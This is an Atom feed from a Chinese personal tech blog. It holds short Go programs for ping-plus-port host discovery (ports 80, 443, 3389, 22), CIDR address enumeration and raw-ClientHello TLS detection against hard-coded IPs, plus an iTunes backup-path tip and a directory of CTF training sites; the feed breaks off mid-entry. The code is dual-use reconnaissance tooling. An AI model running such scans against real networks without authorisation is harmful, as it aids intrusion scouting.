<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>An0nyMouS</title>
  
  <subtitle>当你在眺望深渊时，深渊也在眺望你</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://lfoder.github.io/"/>
  <updated>2018-06-08T04:25:38.000Z</updated>
  <id>http://lfoder.github.io/</id>
  
  <author>
    <name>lfoder</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Golang编写判断IP是否能够Ping通</title>
    <link href="http://lfoder.github.io/2018/06/07/Golang%E7%BC%96%E5%86%99%E5%88%A4%E6%96%ADIP%E6%98%AF%E5%90%A6%E8%83%BD%E5%A4%9FPing%E9%80%9A/"/>
    <id>http://lfoder.github.io/2018/06/07/Golang编写判断IP是否能够Ping通/</id>
    <published>2018-06-07T06:10:07.000Z</published>
    <updated>2018-06-08T04:25:38.000Z</updated>
    
    <content type="html"><![CDATA[<p>人狠话不多，请看代码：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">"time"</span></span><br><span class="line"><span class="string">"net"</span></span><br><span class="line"><span class="string">"fmt"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">isping</span><span class="params">(ip <span class="keyword">string</span>)</span> <span class="params">(<span class="keyword">bool</span>)</span></span> &#123;</span><br><span class="line">recvBuf1 := <span class="built_in">make</span>([]<span class="keyword">byte</span>, <span class="number">2048</span>)</span><br><span class="line">payload:=[]<span class="keyword">byte</span>&#123;<span class="number">0x08</span>,<span class="number">0x00</span>,<span class="number">0x4d</span>,<span class="number">0x4b</span>,<span class="number">0x00</span>,<span class="number">0x01</span>,<span class="number">0x00</span>,<span class="number">0x10</span>,<span class="number">0x61</span>,<span class="number">0x62</span>,<span class="number">0x63</span>,<span class="number">0x64</span>,<span class="number">0x65</span>,<span class="number">0x66</span>,<span class="number">0x67</span>,<span class="number">0x68</span>,<span class="number">0x69</span>,<span class="number">0x6a</span>,<span class="number">0x6b</span>,<span class="number">0x6c</span>,<span class="number">0x6d</span>,<span class="number">0x6e</span>,<span class="number">0x6f</span>,<span class="number">0x70</span>,<span class="number">0x71</span>,<span class="number">0x72</span>,<span class="number">0x73</span>,<span class="number">0x74</span>,<span class="number">0x75</span>,<span class="number">0x76</span>,<span class="number">0x77</span>,<span class="number">0x61</span>,<span class="number">0x62</span>,<span class="number">0x63</span>,<span class="number">0x64</span>,<span class="number">0x65</span>,<span class="number">0x66</span>,<span class="number">0x67</span>,<span class="number">0x68</span>,<span class="number">0x69</span>&#125;</span><br><span class="line">Time, _ := time.ParseDuration(<span class="string">"3s"</span>)</span><br><span class="line">conn, err := net.DialTimeout(<span class="string">"ip4:icmp"</span>, ip,Time)</span><br><span class="line"><span class="keyword">if</span> err !=<span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Println(<span class="string">"bibi"</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">&#125;</span><br><span class="line">_,err=conn.Write(payload)</span><br><span class="line"><span class="keyword">if</span> err !=<span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">&#125;</span><br><span class="line">conn.SetReadDeadline(time.Now().Add(time.Second * <span class="number">2</span>))</span><br><span class="line">num, err := conn.Read(recvBuf1[<span class="number">0</span>:])</span><br><span class="line"><span class="keyword">if</span> err !=<span class="literal">nil</span> &#123;</span><br><span class="line"><span class="comment">//check 80 3389 443 22 port</span></span><br><span class="line">Timetcp, _ := time.ParseDuration(<span class="string">"1s"</span>)</span><br><span class="line">conn1, err := net.DialTimeout(<span class="string">"tcp"</span>, ip+<span class="string">":80"</span>,Timetcp)</span><br><span class="line"><span class="keyword">if</span> err == <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">defer</span> conn1.Close()</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">conn2, err := net.DialTimeout(<span class="string">"tcp"</span>, ip+<span class="string">":443"</span>,Timetcp)</span><br><span class="line"><span class="keyword">if</span> err == <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">defer</span> conn2.Close()</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">conn3, err := net.DialTimeout(<span class="string">"tcp"</span>, ip+<span class="string">":3389"</span>,Timetcp)</span><br><span class="line"><span class="keyword">if</span> err == <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">defer</span> conn3.Close()</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">conn4, err := net.DialTimeout(<span class="string">"tcp"</span>, ip+<span class="string">":22"</span>,Timetcp)</span><br><span class="line"><span class="keyword">if</span> err == <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">defer</span> conn4.Close()</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">&#125;</span><br><span class="line">conn.SetReadDeadline(time.Time&#123;&#125;)</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">string</span>(recvBuf1[<span class="number">0</span>:num]) !=<span class="string">""</span> &#123;</span><br><span class="line"><span class="keyword">return</span>  <span class="literal">true</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>  &#123;</span><br><span class="line">ip := <span class="string">"172.8.47.213"</span></span><br><span class="line">fmt.Println(isping(ip))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      使用Golang语言编写判断IP是否能ping通的代码
    
    </summary>
    
      <category term="Golang编程" scheme="http://lfoder.github.io/categories/Golang%E7%BC%96%E7%A8%8B/"/>
    
    
      <category term="Golang" scheme="http://lfoder.github.io/tags/Golang/"/>
    
      <category term="Ping" scheme="http://lfoder.github.io/tags/Ping/"/>
    
  </entry>
  
  <entry>
    <title>Golang编写通过CIDR遍历IP地址</title>
    <link href="http://lfoder.github.io/2018/06/07/Golang%E7%BC%96%E5%86%99%E9%80%9A%E8%BF%87CIDR%E9%81%8D%E5%8E%86IP%E5%9C%B0%E5%9D%80/"/>
    <id>http://lfoder.github.io/2018/06/07/Golang编写通过CIDR遍历IP地址/</id>
    <published>2018-06-07T06:06:10.000Z</published>
    <updated>2018-06-08T04:25:10.000Z</updated>
    
    <content type="html"><![CDATA[<p>人狠话不多，请看代码：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">"net"</span></span><br><span class="line"><span class="string">"fmt"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">hosts</span><span class="params">(cidr <span class="keyword">string</span>)</span> <span class="params">([]<span class="keyword">string</span>, error)</span></span> &#123;</span><br><span class="line">ip, ipnet, err := net.ParseCIDR(cidr)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> ips []<span class="keyword">string</span></span><br><span class="line"><span class="keyword">for</span> ip := ip.Mask(ipnet.Mask); ipnet.Contains(ip); inc(ip) &#123;</span><br><span class="line">ips = <span class="built_in">append</span>(ips, ip.String())</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> ips[<span class="number">1</span> : <span class="built_in">len</span>(ips)<span class="number">-1</span>], <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">inc</span><span class="params">(ip net.IP)</span></span> &#123;</span><br><span class="line"><span class="keyword">for</span> j := <span class="built_in">len</span>(ip) - <span class="number">1</span>; j &gt;= <span class="number">0</span>; j-- &#123;</span><br><span class="line">ip[j]++</span><br><span class="line"><span class="keyword">if</span> ip[j] &gt; <span class="number">0</span> &#123;</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>  &#123;</span><br><span class="line">hosts, _ := hosts(<span class="string">"192.168.11.9/27"</span>)</span><br><span class="line"><span class="keyword">for</span> _, ip := <span class="keyword">range</span> hosts &#123;</span><br><span class="line"> fmt.Println(<span class="string">"sent: "</span> + ip)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      使用Golang语言编写通过CIDR遍历生成IP地址列表
    
    </summary>
    
      <category term="Golang编程" scheme="http://lfoder.github.io/categories/Golang%E7%BC%96%E7%A8%8B/"/>
    
    
      <category term="Golang" scheme="http://lfoder.github.io/tags/Golang/"/>
    
      <category term="CIDR" scheme="http://lfoder.github.io/tags/CIDR/"/>
    
      <category term="遍历生成IP" scheme="http://lfoder.github.io/tags/%E9%81%8D%E5%8E%86%E7%94%9F%E6%88%90IP/"/>
    
  </entry>
  
  <entry>
    <title>Golang编写检测端口是否为HTTPS</title>
    <link href="http://lfoder.github.io/2018/06/07/Golang%E7%BC%96%E5%86%99%E6%A3%80%E6%B5%8B%E7%AB%AF%E5%8F%A3%E6%98%AF%E5%90%A6%E4%B8%BAHTTPS/"/>
    <id>http://lfoder.github.io/2018/06/07/Golang编写检测端口是否为HTTPS/</id>
    <published>2018-06-07T06:02:30.000Z</published>
    <updated>2018-06-07T06:09:46.000Z</updated>
    
    <content type="html"><![CDATA[<p>人狠话不多，请看代码:</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">"fmt"</span></span><br><span class="line"><span class="string">"time"</span></span><br><span class="line"><span class="string">"net"</span></span><br><span class="line"><span class="string">"strconv"</span></span><br><span class="line"><span class="string">"os"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">t:=[]<span class="keyword">byte</span>&#123;<span class="number">0x16</span>,<span class="number">0x03</span>,<span class="number">0x01</span>,<span class="number">0x00</span>,<span class="number">0xb5</span>,<span class="number">0x01</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0xb1</span>,<span class="number">0x03</span>,<span class="number">0x03</span>,<span class="number">0xb2</span>,<span class="number">0xd3</span>,<span class="number">0x4d</span>,<span class="number">0xfd</span>,<span class="number">0x63</span>,<span class="number">0xbe</span>,<span class="number">0x89</span>,<span class="number">0xdb</span>,<span class="number">0xe5</span>,<span class="number">0x46</span>,<span class="number">0xcc</span>,<span class="number">0xaf</span>,<span class="number">0x39</span>,<span class="number">0x6e</span>,<span class="number">0xba</span>,<span class="number">0x63</span>,<span class="number">0x63</span>,<span class="number">0x75</span>,<span class="number">0xce</span>,<span class="number">0x30</span>,<span class="number">0xda</span>,<span class="number">0xe0</span>,<span class="number">0x4f</span>,<span class="number">0xab</span>,<span class="number">0xa2</span>,<span class="number">0x3e</span>,<span class="number">0x50</span>,<span class="number">0xea</span>,<span class="number">0x41</span>,<span class="number">0x20</span>,<span class="number">0x10</span>,<span class="number">0xc4</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x18</span>,<span class="number">0xc0</span>,<span class="number">0x2b</span>,<span class="number">0xc0</span>,<span class="number">0x2f</span>,<span class="number">0xc0</span>,<span class="number">0x2c</span>,<span class="number">0xc0</span>,<span class="number">0x30</span>,<span class="number">0xc0</span>,<span class="number">0x13</span>,<span class="number">0xc0</span>,<span class="number">0x14</span>,<span class="number">0x00</span>,<span class="number">0x9c</span>,<span class="number">0x00</span>,<span class="number">0x9d</span>,<span class="number">0x00</span>,<span class="number">0x2f</span>,<span class="number">0x00</span>,<span class="number">0x35</span>,<span class="number">0x00</span>,<span class="number">0x0a</span>,<span class="number">0x00</span>,<span class="number">0xff</span>,<span class="number">0x01</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x70</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x15</span>,<span class="number">0x00</span>,<span class="number">0x13</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x10</span>,<span class="number">0x77</span>,<span class="number">0x77</span>,<span class="number">0x77</span>,<span class="number">0x2e</span>,<span class="number">0x73</span>,<span class="number">0x6f</span>,<span class="number">0x2d</span>,<span class="number">0x63</span>,<span class="number">0x6f</span>,<span class="number">0x6f</span>,<span class="number">0x6c</span>,<span class="number">0x73</span>,<span class="number">0x2e</span>,<span class="number">0x63</span>,<span class="number">0x6f</span>,<span class="number">0x6d</span>,<span class="number">0x00</span>,<span class="number">0x0b</span>,<span class="number">0x00</span>,<span class="number">0x04</span>,<span class="number">0x03</span>,<span class="number">0x00</span>,<span class="number">0x01</span>,<span class="number">0x02</span>,<span class="number">0x00</span>,<span class="number">0x0a</span>,<span class="number">0x00</span>,<span class="number">0x06</span>,<span class="number">0x00</span>,<span class="number">0x04</span>,<span class="number">0x00</span>,<span class="number">0x17</span>,<span class="number">0x00</span>,<span class="number">0x18</span>,<span class="number">0x00</span>,<span class="number">0x23</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x0d</span>,<span class="number">0x00</span>,<span class="number">0x20</span>,<span class="number">0x00</span>,<span class="number">0x1e</span>,<span class="number">0x06</span>,<span class="number">0x01</span>,<span class="number">0x06</span>,<span class="number">0x02</span>,<span class="number">0x06</span>,<span class="number">0x03</span>,<span class="number">0x05</span>,<span class="number">0x01</span>,<span class="number">0x05</span>,<span class="number">0x02</span>,<span class="number">0x05</span>,<span class="number">0x03</span>,<span class="number">0x04</span>,<span class="number">0x01</span>,<span class="number">0x04</span>,<span class="number">0x02</span>,<span class="number">0x04</span>,<span class="number">0x03</span>,<span class="number">0x03</span>,<span class="number">0x01</span>,<span class="number">0x03</span>,<span class="number">0x02</span>,<span class="number">0x03</span>,<span class="number">0x03</span>,<span class="number">0x02</span>,<span class="number">0x01</span>,<span class="number">0x02</span>,<span class="number">0x02</span>,<span class="number">0x02</span>,<span class="number">0x03</span>,<span class="number">0x00</span>,<span class="number">0x05</span>,<span class="number">0x00</span>,<span class="number">0x05</span>,<span class="number">0x01</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x0f</span>,<span class="number">0x00</span>,<span class="number">0x01</span>,<span class="number">0x01</span>,<span class="number">0x00</span>,<span class="number">0x10</span>,<span class="number">0x00</span>,<span class="number">0x0b</span>,<span class="number">0x00</span>,<span class="number">0x09</span>,<span class="number">0x08</span>,<span class="number">0x68</span>,<span class="number">0x74</span>,<span class="number">0x74</span>,<span class="number">0x70</span>,<span class="number">0x2f</span>,<span class="number">0x31</span>,<span class="number">0x2e</span>,<span class="number">0x31</span>&#125;</span><br><span class="line"></span><br><span class="line">Target:=<span class="string">"115.239.210.27"</span></span><br><span class="line">port:=<span class="number">443</span></span><br><span class="line">Time, _ := time.ParseDuration(<span class="string">"1s"</span>)</span><br><span class="line">conn, err := net.DialTimeout(<span class="string">"tcp"</span>, Target+<span class="string">":"</span>+strconv.Itoa(port), Time )</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Println(<span class="string">"ERR::"</span> + strconv.Itoa(port) + <span class="string">"&gt;"</span> + err.Error())</span><br><span class="line">os.Exit(<span class="number">1</span>)</span><br><span class="line">&#125;</span><br><span class="line">conn.Write(t)</span><br><span class="line">recvBuf := <span class="built_in">make</span>([]<span class="keyword">byte</span>, <span class="number">2048</span>)</span><br><span class="line">conn.SetReadDeadline(time.Now().Add(time.Second * <span class="number">2</span>))</span><br><span class="line">_, err = conn.Read(recvBuf[:])</span><br><span class="line">conn.SetReadDeadline(time.Time&#123;&#125;)</span><br><span class="line">fmt.Println(<span class="string">"tlsinfo:"</span>)</span><br><span class="line">fmt.Println( <span class="keyword">string</span>(recvBuf[:]))</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">string</span>(recvBuf[<span class="number">0</span>:<span class="number">4</span>]) == <span class="keyword">string</span>([] <span class="keyword">byte</span> &#123;<span class="number">22</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">0</span>&#125;) &#123;</span><br><span class="line">fmt.Println(<span class="string">"this is tls ^_^"</span>)</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">fmt.Println(<span class="string">"this is not tls"</span>)</span><br><span class="line">&#125;</span><br><span class="line">conn.Close()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      Golang代码去编写一个判断端口是否使用HTTPS
    
    </summary>
    
      <category term="Golang编程" scheme="http://lfoder.github.io/categories/Golang%E7%BC%96%E7%A8%8B/"/>
    
    
      <category term="Golang" scheme="http://lfoder.github.io/tags/Golang/"/>
    
      <category term="HTTPS" scheme="http://lfoder.github.io/tags/HTTPS/"/>
    
  </entry>
  
  <entry>
    <title>iTunes备份iPhone系统在MacOS上的备份文件路径</title>
    <link href="http://lfoder.github.io/2018/06/06/iTunes%E5%A4%87%E4%BB%BDiPhone%E7%B3%BB%E7%BB%9F%E5%9C%A8MacOS%E4%B8%8A%E7%9A%84%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%E8%B7%AF%E5%BE%84/"/>
    <id>http://lfoder.github.io/2018/06/06/iTunes备份iPhone系统在MacOS上的备份文件路径/</id>
    <published>2018-06-06T02:47:13.000Z</published>
    <updated>2018-06-06T02:52:57.000Z</updated>
    
    <content type="html"><![CDATA[<p>MacOS 的存储空间相当有限，用来存储iPhone的手机备份相当浪费，一个备份20多个G，伤不起…. 于是有了本文。</p><p>最简单的找到备份文件位置的方法：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~/Library/Application\ Support/MobileSync/Backup</span><br><span class="line">open .</span><br></pre></td></tr></table></figure><p>此时弹出MacOS的Finder窗口，有一个Backup文件夹，这里面就是iPhone通过iTunes在MacOS上的备份文件路径，你可以拷贝到移动硬盘上以节省空间。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;MacOS 的存储空间相当有限，用来存储iPhone的手机备份相当浪费，一个备份20多个G，伤不起…. 于是有了本文。&lt;/p&gt;
&lt;p&gt;最简单的找到备份文件位置的方法：&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td cla
      
    
    </summary>
    
    
      <category term="iOS备份" scheme="http://lfoder.github.io/tags/iOS%E5%A4%87%E4%BB%BD/"/>
    
      <category term="iTunes" scheme="http://lfoder.github.io/tags/iTunes/"/>
    
  </entry>
  
  <entry>
    <title>CTF比赛训练路线全导航</title>
    <link href="http://lfoder.github.io/2018/06/05/CTF%E6%AF%94%E8%B5%9B%E8%AE%AD%E7%BB%83%E8%B7%AF%E7%BA%BF%E5%85%A8%E5%AF%BC%E8%88%AA/"/>
    <id>http://lfoder.github.io/2018/06/05/CTF比赛训练路线全导航/</id>
    <published>2018-06-05T03:19:27.000Z</published>
    <updated>2018-06-05T03:19:42.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="CTF资讯信息"><a href="#CTF资讯信息" class="headerlink" title="CTF资讯信息"></a>CTF资讯信息</h3><h4 id="CTF-比赛资讯"><a href="#CTF-比赛资讯" class="headerlink" title="CTF 比赛资讯"></a>CTF 比赛资讯</h4><ul><li><a href="https://www.xctf.org.cn/" target="_blank" rel="noopener">XCTF社区</a></li><li><a href="https://www.ctftime.org" target="_blank" rel="noopener">CTFTime</a></li><li><a href="https://www.ctfrank.org/" target="_blank" rel="noopener">CTFRank</a></li></ul><h4 id="全球安全信息资讯"><a href="#全球安全信息资讯" class="headerlink" title="全球安全信息资讯"></a>全球安全信息资讯</h4><h5 id="国内安全资讯"><a href="#国内安全资讯" class="headerlink" title="国内安全资讯"></a>国内安全资讯</h5><ul><li><a href="http://www.freebuf.com" target="_blank" rel="noopener">Freebuf</a></li><li><a href="https://www.seebug.org/" target="_blank" rel="noopener">知道创宇</a></li><li><a href="http://www.sebug.org/" target="_blank" rel="noopener">SOBUG</a></li><li><a href="https://wiki.ioin.in/" target="_blank" rel="noopener">Sec-News</a></li><li><a href="http://www.4hou.com/" target="_blank" rel="noopener">嘶吼</a></li><li><p><a href="https://xz.aliyun.com/" target="_blank" rel="noopener">先知白帽社区</a></p><h5 id="国外安全资讯"><a href="#国外安全资讯" class="headerlink" title="国外安全资讯"></a>国外安全资讯</h5></li><li><p><a href="https://securitytracker.com/" target="_blank" rel="noopener">SecurityTracker</a></p></li><li><a href="https://www.securityfocus.com/" target="_blank" rel="noopener">SecurityFocus</a></li><li><a href="http://securityvulns.com/" target="_blank" rel="noopener">SecurityVulns</a></li><li><a href="http://www.securiteam.com/" target="_blank" rel="noopener">SecuriTeam</a></li><li><a href="https://packetstormsecurity.com/" target="_blank" rel="noopener">PacketStormSecurity</a></li><li><a href="https://www.blackmoreops.com/" target="_blank" rel="noopener">BlackMoreOps</a></li><li><a href="http://techgenix.com/top-tech-news/" target="_blank" rel="noopener">TechGenix</a></li></ul><h3 id="CTF综合训练营"><a href="#CTF综合训练营" class="headerlink" title="CTF综合训练营"></a>CTF综合训练营</h3><h4 id="国内CTF训练营"><a href="#国内CTF训练营" class="headerlink" title="国内CTF训练营"></a>国内CTF训练营</h4><ul><li><a href="http://ctf.bugku.com/" target="_blank" rel="noopener">BugKu</a></li><li><a href="http://ctf.nuptsast.com/" target="_blank" rel="noopener">南京邮电大学网络攻防训练平台</a></li><li><a href="http://www.sniperoj.com/" target="_blank" rel="noopener">SniperOJ</a></li><li><a href="https://www.jarvisoj.com/" target="_blank" rel="noopener">Jarvisoj</a></li><li><a href="http://www.fj543.com/hack/" target="_blank" rel="noopener">黑客丛林之旅</a>  </li><li><a href="http://monyer.com/game/game1/" target="_blank" rel="noopener">梦之光芒</a></li><li><a href="http://oj.xctf.org.cn/" target="_blank" rel="noopener">XCTF_OJ竞赛平台</a></li><li><a href="http://www.baimaoxueyuan.com/ctf" target="_blank" rel="noopener">白帽学院</a></li><li><a href="https://www.ichunqiu.com/battalion" target="_blank" rel="noopener">i春秋CTF训练营</a></li><li><a href="http://www.hetianlab.com/CTFrace.html" target="_blank" rel="noopener">合天网安实验室CTF训练平台</a></li><li><a href="http://www.shiyanbar.com/ctf/practice" target="_blank" rel="noopener">实验吧CTF训练平台</a></li><li><a href="https://ctf-wiki.github.io/ctf-wiki/introduction/resources/" target="_blank" rel="noopener">CTF WiKi</a></li><li><a href="https://ctflearn.com/" target="_blank" rel="noopener">CTFLearn</a></li></ul><h4 id="国外CTF训练营"><a href="#国外CTF训练营" class="headerlink" title="国外CTF训练营"></a>国外CTF训练营</h4><ul><li><a href="http://www.wechall.net/" target="_blank" rel="noopener">WeChall.Net</a></li><li><a href="http://wargame.kr/" target="_blank" rel="noopener">WarGame.Kr</a></li><li><a href="http://webhacking.kr/" target="_blank" rel="noopener">WebHacking.Kr</a></li><li><a href="http://fun.coolshell.cn/" target="_blank" rel="noopener">CoolShell.cn</a></li><li><a href="https://backdoor.sdslabs.co/" target="_blank" rel="noopener">SdsLabs.co</a></li><li><a href="http://smashthestack.org/" target="_blank" rel="noopener">SmashTheStack</a></li></ul><h4 id="CTF-Writeup-知识库"><a href="#CTF-Writeup-知识库" class="headerlink" title="CTF Writeup 知识库"></a>CTF Writeup 知识库</h4><ul><li><a href="http://bobao.360.cn/ctf/" target="_blank" rel="noopener">安全客CTF攻略</a></li><li><a href="https://github.com/ctfs/" target="_blank" rel="noopener">Github CTFs WriteUp</a></li><li><a href="https://github.com/p4-team/ctf" target="_blank" rel="noopener">Github CTF WriteUp P4-Team</a></li><li><a href="http://yka.me/#!index.md" target="_blank" rel="noopener">Yka.me</a></li><li><a href="https://github.com/VulnHub/ctf-writeups" target="_blank" rel="noopener">VulnHub-CTFTime</a></li><li><a href="http://captf.com/" target="_blank" rel="noopener">Capture the Flag</a></li><li><a href="http://www.blue-lotus.net/" target="_blank" rel="noopener">Blue-Lotus</a></li><li><a href="http://blog.0ops.net/" target="_blank" rel="noopener">Oops.Net</a></li><li><a href="http://www.programlife.net/category/ctf" target="_blank" rel="noopener">ProgramLife</a></li><li><a href="https://bl4ck.in/" target="_blank" rel="noopener">Bl4ck.in</a></li></ul><h3 id="CTF分项训练营"><a href="#CTF分项训练营" class="headerlink" title="CTF分项训练营"></a>CTF分项训练营</h3><h4 id="逆向-Reverse"><a href="#逆向-Reverse" class="headerlink" title="逆向 Reverse"></a>逆向 Reverse</h4><ul><li><a href="https://www.52pojie.cn/forum-67-1.html" target="_blank" rel="noopener">吾爱破解论坛 2014 CrackMe安全挑战赛</a></li><li><a href="https://www.52pojie.cn/forum-71-1.html" target="_blank" rel="noopener">吾爱破解论坛 2016 CrackMe安全挑战赛</a></li><li><a href="https://ctf.pediy.com/" target="_blank" rel="noopener">看雪技术论坛 CTF安全挑战赛</a> </li><li><a href="https://www.kanxue.com/chm.htm" target="_blank" rel="noopener">看学技术论坛知识库</a></li><li><a href="http://reversing.kr/" target="_blank" rel="noopener">Reversing.Kr</a></li><li><a href="http://pwnable.kr/" target="_blank" rel="noopener">Pwnable.Kr</a></li><li><a href="https://exploit-exercises.com/" target="_blank" rel="noopener">Exploit Exercises</a></li><li><a href="http://overthewire.org/wargames/" target="_blank" rel="noopener">OverTheWire</a></li><li><a href="http://security.cs.rpi.edu/courses/binexp-spring2015/" target="_blank" rel="noopener">Modern Binary Exploitation</a></li><li><a href="https://github.com/CHYbeta/Software-Security-Learning" target="_blank" rel="noopener">SoftWare-Security-Learning</a></li></ul><h4 id="Pwn"><a 